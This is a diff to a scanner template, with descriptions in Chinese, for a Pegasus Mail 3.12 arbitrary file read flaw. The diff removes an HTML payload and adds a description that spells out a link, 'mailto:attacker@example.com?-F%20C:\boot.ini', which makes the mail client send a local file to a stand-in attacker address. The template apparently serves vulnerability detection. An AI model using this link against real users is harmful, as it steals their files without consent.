@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "通过构造包含 mailto: 协议及 -F 参数的恶意 HTML 页面，诱导目标用户点击后利用 Pegasus Mail 转发功能读取系统任意文件"
+description = '通过 mailto: 协议 -F 参数读取目标任意文件。攻击者构造 mailto:attacker@example.com?-F%20C:\boot.ini 链接嵌入网页或邮件，Pegasus Mail 3.12 用户点击后自动将指定文件作为附件转发给攻击者。'
 id = "POC-AVE-2000-0681"
 name = "David Harris Pegasus Mail 3.12 任意文件读取漏洞 PoC"
 severity = "medium"
@@ -15,20 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc-ave-2000-0681.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = '''
-<html>
-<body>
-<img src="mailto:attacker@example.com -F c:\boot.ini">
-</body>
-</html>'''
-type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["mailto"]
+words = [
+    "Pegasus Mail",
+    "Pegasus",
+]
